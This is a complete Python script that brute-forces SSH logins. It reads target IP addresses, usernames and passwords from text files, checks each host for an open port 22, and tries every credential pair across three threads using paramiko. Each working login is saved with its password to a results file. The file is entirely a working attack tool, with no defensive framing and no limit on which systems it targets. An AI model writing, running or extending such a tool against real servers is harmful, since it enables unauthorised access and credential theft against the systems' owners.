import paramiko
import threading
import queue
import socket

def is_ssh_open(ip):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(1)
    try:
        sock.connect((ip, 22))
        sock.close()
        return True
    except:
        return False

def ssh_login(ip, username, password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(ip, username=username, password=password)
        print(f'Success: {ip}, {username}, {password}')
        with open('result.txt', 'a') as f:
            f.write(f'Success: {ip}, {username}, {password}\n')
    except:
        pass
    finally:
        ssh.close()

with open('ipaddress.txt') as f:
    ips = f.read().splitlines()

with open('username.txt') as f:
    usernames = f.read().splitlines()

with open('password.txt') as f:
    passwords = f.read().splitlines()

q = queue.Queue()

for ip in ips:
    print(f'Start check IP: {ip}')
    if is_ssh_open(ip):
        for username in usernames:
            for password in passwords:
                q.put((ip, username, password))

def worker():
    while not q.empty():
        ip, username, password = q.get()
        ssh_login(ip, username, password)
        q.task_done()

for i in range(3): #DEFINE NUMBER OF THREADS
    threading.Thread(target=worker).start()
